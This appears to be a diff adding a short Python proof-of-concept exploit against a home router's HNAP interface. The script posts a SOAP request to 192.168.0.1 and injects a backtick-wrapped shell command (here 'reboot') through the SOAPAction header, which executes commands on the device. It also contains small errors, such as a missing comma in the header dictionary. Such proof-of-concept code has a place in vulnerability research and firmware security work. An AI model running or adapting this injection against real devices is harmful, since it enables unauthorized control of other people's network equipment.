@@ -1,0 +1,28 @@
+from pwn import*
+import requests
+import sys
+
+data="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
+<soap:Envelop xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelop/\" soap:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\
+ <soap:Body>\
+  <GetWanSettings xmlns=\"http://purenetworks.com/HNAP1/\">\
+  </GetWanSettings>\
+ </soap:Body>\
+</soap:Envelop>"
+
+
+if __name__=="__main__":
+ cmd="reboot" 
+ fake_cmd="http://purenetworks.com/HNAP1/GetDeviceSsettings/`%s`" %cmd
+ print fake_cmd
+ header = {
+  'SOAPAction' : fake_cmd,
+  'Cookie' : "uid=LS32Srlx8N",
+  'Content-Type' : 'text/xml'
+  'Content-Length' : str(len(data))
+ }
+ url="http://192.168.0.1/HNAP1/"
+ r=requests.post(url=url,headers=header,data=data)
+ print r.content
+ log.info("kirin-say PWN")
+
